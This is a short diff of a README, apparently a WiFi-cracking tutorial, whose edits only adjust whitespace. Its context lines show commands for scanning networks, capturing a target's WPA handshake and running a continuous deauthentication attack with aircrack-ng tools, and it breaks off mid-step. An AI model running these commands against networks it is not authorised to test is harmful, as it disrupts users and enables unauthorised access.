@@ -33,11 +33,13 @@ Instructions for any initial setup:
 1. `sudo airodump-ng wlan0`
 2.  It will show you all the wifi networks in your vicinity
 3.  What to look for BSSID, CH, ESSID of the target network.
-        * Example: ![Airodump Scan](images/airodump.png)
+     * Example: ![Airodump Scan](images/airodump.png)
+    
 
 ### Step 2: Capturing the Handshake
 1.  `sudo airodump-ng -c [channel] --bssid [BSSID] --write capture wlan0`.
     * Example: ![Handshake Capture](images/handshake.png)
+      
 2.  (Optional) Deauthenticating a client to speed up handshake capture.
     * `sudo aireplay-ng --deauth 0 -a [BSSID] wlan0`
         * Example:
